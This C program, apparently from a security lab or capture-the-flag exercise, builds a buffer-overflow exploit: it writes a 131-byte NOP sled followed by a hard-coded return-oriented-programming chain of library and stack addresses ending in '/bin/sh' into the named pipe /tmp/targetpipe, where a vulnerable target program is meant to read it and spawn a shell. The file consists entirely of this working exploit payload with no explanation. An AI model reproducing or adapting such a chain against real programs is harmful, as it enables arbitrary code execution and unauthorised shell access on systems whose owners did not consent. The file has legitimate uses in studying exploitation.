#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char strfinal[731]; 
  int i;
  for(i = 0; i < 131; i++)
    memcpy(strfinal + i, "\x90", 1);
  char copy[600] = "\xd4\xbe\xb3\xbb\xe1\xa0\xb9\xbb\xdc\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\xe1\xa0\xb9\xbb\xd8\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\xe1\xa0\xb9\xbb\xd4\x04\xbf\xbf\x88\x2d\xb5\xbb\x8a\xb8\xb7\xbb\x1b\xdc\xb9\xbb\x8a\x01\x40\x40\x2e\x3b\xb4\xbb\x8a\xe9\xb3\xbb\xe5\xb6\xa9\xbb\x2a\x01\xad\xbb\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x1b\xdc\xb9\xbb\x64\x05\xbf\xbf\x79\x2d\xb5\xbb\x1b\xdc\xb9\xbb\x90\x02\x30\x39\xe1\xa0\xb9\xbb\x78\x05\xbf\xbf\x88\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x7f\x20\x20\x01\x1b\xdc\xb9\xbb\x7f\x02\x02\x01\x8a\xe9\xb3\xbb\x1b\xdc\xb9\xbb\x7c\x05\xbf\xbf\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x78\x05\xbf\xbf\x1b\xdc\xb9\xbb\x68\x05\xbf\xbf\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x10\x40\x40\x40\x1b\xdc\xb9\xbb\x6c\x05\xbf\xbf\xe8\x27\xac\xbb\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x62\x40\x40\x40\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\x21\x16\xac\xbb\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe1\xa0\xb9\xbb\x03\x04\x04\x04\xe8\x27\xac\xbb\x1b\xdc\xb9\xbb\xf4\x05\xbf\xbf\x79\x2d\xb5\xbb\x1b\xdc\xb9\xbb\x10\x06\xbf\xbf\x79\x2d\xb5\xbb\x1b\xdc\xb9\xbb\x2c\x06\xbf\xbf\x79\x2d\xb5\xbb\x6d\x3b\xad\xbb\x1b\xdc\xb9\xbb\x30\x06\xbf\xbf\x79\x2d\xb5\xbb\x6d\x3b\xad\xbb\x1b\xdc\xb9\xbb\x14\x06\xbf\xbf\x79\x2d\xb5\xbb\x6d\x3b\xad\xbb\x1b\xdc\xb9\xbb\xf8\x05\xbf\xbf\x79\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x5a\x04\x04\x04\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\xe2\xd3\xb2\xbb\x11\x11\x11\x11\x12\x12\x12\x12\xe1\xa0\xb9\xbb\x5a\x04\x04\x04\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\xe2\xd3\xb2\xbb\x21\x21\x21\x21\x22\x22\x22\x22\xe1\xa0\xb9\xbb\x5a\x14\x14\x14\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\xe2\xd3\xb2\xbb\x31\x31\x31\x31\x32\x32\x32\x32\xe1\xa0\xb9\xbb\x6c\x06\xbf\xbf\xd4\xbe\xb3\xbb\x88\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x74\x06\xbf\xbf\x88\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x3b\x40\x40\x40\xe8\x27\xac\xbb\xe5\xb6\xa9\xbb\x90\x90\x90\x90\x78\x06\xbf\xbf\x70\x06\xbf\xbf\x90\x90\x90\x90\x78\x06\xbf\xbf\x90\x90\x90\x90/bin/sh\x00";
  strcpy(strfinal + 131, copy);  
  writecmd(PIPEPATH, strfinal);
  return 0;
}
